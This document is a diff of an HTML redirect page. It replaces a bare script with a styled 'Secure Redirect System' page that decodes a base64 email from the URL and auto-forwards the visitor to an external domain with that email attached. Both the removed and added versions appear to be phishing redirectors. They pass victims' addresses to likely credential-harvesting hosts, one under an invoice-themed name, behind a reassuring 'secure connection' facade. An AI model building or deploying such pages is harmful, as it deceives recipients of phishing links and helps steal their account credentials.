@@ -1,26 +1,231 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Redirt</title>
-  <script>
-    function encodeAndRedirect() {
-      const params = new URLSearchParams(window.location.search);
-      const email = params.get("e");
-
-      if (email) {
-        const encoded = email.replace(/@/g, 'YYY').replace(/\./g, 'ZZZ').split('').reverse().join('');
-        const targetUrl = `https://salesinvfiles.vercel.app/?e=${encoded}`;
-        window.location.href = targetUrl;
-      } else {
-        document.body.innerHTML = "<h2>Not allowed to access this page</h2>";
-      }
-    }
-
-    window.onload = encodeAndRedirect;
-  </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Redirect System</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: #e2e8f0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow-x: hidden;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 600px;
+            text-align: center;
+        }
+        
+        .logo {
+            margin-bottom: 30px;
+            opacity: 0;
+            animation: fadeIn 1.2s ease-out forwards;
+        }
+        
+        .logo h1 {
+            font-size: 2.2rem;
+            font-weight: 700;
+            background: linear-gradient(90deg, #3b82f6 0%, #10b981 50%, #6366f1 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+        }
+        
+        .logo p {
+            color: #94a3b8;
+            font-size: 1.1rem;
+        }
+        
+        .panel {
+            background: rgba(30, 41, 59, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transform: translateY(20px);
+            opacity: 0;
+            transition: transform 0.6s ease-out, opacity 0.6s ease-out;
+        }
+        
+        .panel.visible {
+            transform: translateY(0);
+            opacity: 1;
+        }
+        
+        .panel h2 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: #f8fafc;
+            font-weight: 600;
+        }
+        
+        .status {
+            margin: 25px 0;
+            padding: 15px;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.05);
+        }
+        
+        .countdown {
+            font-size: 1.2rem;
+            margin: 15px 0;
+            color: #3b82f6;
+            font-weight: 600;
+        }
+        
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #3b82f6 0%, #10b981 100%);
+            border-radius: 4px;
+            transition: width 0.3s ease;
+        }
+        
+        .email-display {
+            margin: 20px 0;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            word-break: break-all;
+        }
+        
+        .action-button {
+            margin-top: 20px;
+            padding: 12px 24px;
+            background: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .action-button:hover {
+            background: #2563eb;
+            transform: translateY(-2px);
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+    </style>
 </head>
 <body>
-  <p></p>
+    <div class="container">
+        <div class="logo">
+            <h1>Secure Redirect System</h1>
+            <p>Processing your request securely</p>
+        </div>
+        
+        <div class="panel" id="redirectPanel">
+            <h2>Redirect in Progress</h2>
+            
+            <div class="status">
+                <p>We are preparing your secure connection</p>
+                <div class="countdown" id="countdown">Redirecting in 2 seconds</div>
+                
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                
+                <div class="email-display" id="emailDisplay">
+                    Email: Processing...
+                </div>
+            </div>
+            
+            <button class="action-button" id="manualRedirect">Redirect Now</button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const panel = document.getElementById('redirectPanel');
+            const countdown = document.getElementById('countdown');
+            const progressBar = document.getElementById('progressBar');
+            const emailDisplay = document.getElementById('emailDisplay');
+            const manualRedirect = document.getElementById('manualRedirect');
+            
+            // Show panel after a short delay
+            setTimeout(() => {
+                panel.classList.add('visible');
+            }, 300);
+            
+            // Get the email parameter from the URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const base64Email = urlParams.get('doonxxxlive');
+            
+            // Decode the email from base64
+            let decodedEmail = '';
+            if (base64Email) {
+                try {
+                    decodedEmail = atob(base64Email);
+                    emailDisplay.textContent = `Email: ${decodedEmail}`;
+                } catch (e) {
+                    emailDisplay.textContent = 'Error: Invalid email parameter';
+                    console.error('Base64 decoding error:', e);
+                }
+            } else {
+                emailDisplay.textContent = 'Error: No email parameter found';
+            }
+            
+            // Set up the redirect
+            let secondsLeft = 2;
+            const redirectUrl = `https://wd0c435.doonxxxlive.com/UOEnoDSy?haz=uabe3w2tkodvPDMPjvjj1yJhfPqE1r0RVSgqIK4x5nQ5-LAplYZwUeECmdM#${decodedEmail}`;
+            
+            // Update countdown and progress bar
+            const countdownInterval = setInterval(() => {
+                secondsLeft--;
+                countdown.textContent = `Redirecting in ${secondsLeft} second${secondsLeft !== 1 ? 's' : ''}`;
+                progressBar.style.width = `${(2 - secondsLeft) * 50}%`;
+                
+                if (secondsLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    window.location.href = redirectUrl;
+                }
+            }, 1000);
+            
+            // Manual redirect button
+            manualRedirect.addEventListener('click', () => {
+                clearInterval(countdownInterval);
+                window.location.href = redirectUrl;
+            });
+        });
+    </script>
 </body>
 </html>
